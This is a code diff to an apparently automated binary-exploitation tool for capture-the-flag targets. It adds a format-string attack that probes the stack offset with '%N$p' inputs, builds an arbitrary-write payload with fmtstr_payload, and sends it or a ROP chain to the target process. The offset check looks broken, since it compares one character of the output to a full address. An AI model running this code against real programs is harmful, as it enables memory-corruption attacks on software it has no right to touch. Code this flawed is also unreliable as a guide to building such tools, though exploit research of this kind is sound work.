@@ -39,6 +39,7 @@ class Against:
 
         self.process = None
         
+        self.format_exploit = None
         self.chain = None
         self.padding = None
         self.exploit = None
@@ -270,27 +271,46 @@ class Against:
 
     def format_write(self, value, addr):
         """Return a format write string payload."""
-
         payload_writes = {
             addr: value
         }
 
-        first_offset = 6
-        chain = fmstr_payload(first_offset, payload_writes, write_size='byte')
+        aegis_log.info(f"Setting up format string write to {hex(addr)} with value {hex(value)}")
+        offset = 0
 
-        return chain
+        for i in range(1,100):
+            p = process(self.binary)
+            probe = "AAAAAAAZ%" + str(i) + "$p"
+            p.sendline(bytes(probe,"utf-8"))
+
+            data = p.recvall(timeout=2).decode().strip("\n")
+            if data[1] == "0x5a41414141414141":
+                offset = i
+                p.close()
+                break
+            p.close()
+
+        self.format_exploit = fmtstr_payload(offset, payload_writes, write_size='byte')
 
     def send_exploit(self):
         """Send the exploit that was generated."""
         #aegis_log.info(f"Sending exploit with padding {self.padding} and chain {self.chain}")
-        aegis_log.info(f"Sending chain as {self.chain}") 
         self.exploit = self.padding + self.chain
-        if self.exploit != None:
+
+        if self.exploit != None and self.format_exploit == None:
+            aegis_log.info(f"Sending chain as {self.chain}") 
             if self.debug == True:
                 self.process.sendline(self.exploit)
                 self.process.interactive()
             else:
                 self.process.sendline(self.exploit)
+        else:
+            aegis_log.info(f"Sending format string exploit as {self.format_exploit}")
+            if self.debug == True:
+                self.process.sendline(self.format_exploit)
+                self.process.interactive()
+            else:
+                self.process.sendline(self.format_exploit)
 
 
     def verify_flag(self):
